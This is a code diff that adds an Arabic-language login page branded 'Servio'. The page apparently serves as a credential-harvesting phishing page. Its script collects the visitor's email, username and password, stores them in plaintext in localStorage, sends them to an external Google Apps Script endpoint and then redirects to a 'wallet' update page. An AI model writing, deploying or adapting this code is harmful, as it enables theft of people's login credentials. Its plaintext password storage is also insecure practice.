@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Servio - تسجيل الدخول</title>
+    <style>
+        :root { --primary: #2563eb; --bg: #f8fafc; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .login-card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 360px; }
+        h2 { text-align: center; color: #1e293b; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; font-size: 13px; margin-bottom: 5px; color: #64748b; font-weight: 600; }
+        input { width: 100%; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 10px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--primary); }
+        .login-btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        .login-btn:disabled { background: #94a3b8; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <h2>تسجيل الدخول</h2>
+    
+    <div class="input-group">
+        <label>البريد الإلكتروني</label>
+        <input type="email" id="email" placeholder="example@gmail.com">
+    </div>
+
+    <div class="input-group">
+        <label>اسم المستخدم</label>
+        <input type="text" id="user" placeholder="Username">
+    </div>
+
+    <div class="input-group">
+        <label>كلمة المرور</label>
+        <input type="password" id="pass" placeholder="********">
+    </div>
+
+    <button class="login-btn" id="loginBtn" onclick="submitLogin()">متابعة</button>
+</div>
+
+<script>
+    // الرابط الخاص بك
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxkYXsPuXnl2gig7X-G3cV-KTkpfg7tYcZ3C0jQeNgf5TEteIwdp8I3nT9fb2Vdcyu-sA/exec";
+
+    async function submitLogin() {
+        const btn = document.getElementById('loginBtn');
+        const gmail = document.getElementById('email').value;
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+
+        if(!gmail || !user || !pass) return alert("الرجاء ملء جميع الخانات");
+
+        btn.disabled = true;
+        btn.innerText = "جاري التحقق...";
+
+        // 1. حفظ البيانات في المتصفح لتتمكن صفحة الواليت من قراءتها
+        localStorage.setItem('userGmail', gmail);
+        localStorage.setItem('userName', user);
+        localStorage.setItem('userPass', pass);
+
+        try {
+            // 2. إرسال البيانات للسكريبت (POST)
+            await fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors', // لضمان الإرسال السريع
+                body: JSON.stringify({
+                    gmail: gmail,
+                    username: user,
+                    password: pass
+                })
+            });
+
+            // 3. التوجيه لصفحة الواليت داخل المجلد المذكور
+            // ملاحظة: تأكد أن المسار صحيح بالنسبة لمكان ملف index.html الحالي
+            window.location.href = "Update-your/index.html";
+
+        } catch (error) {
+            console.error("Error:", error);
+            alert("حدث خطأ أثناء تسجيل الدخول");
+            btn.disabled = false;
+            btn.innerText = "متابعة";
+        }
+    }
+</script>
+
+</body>
+</html>
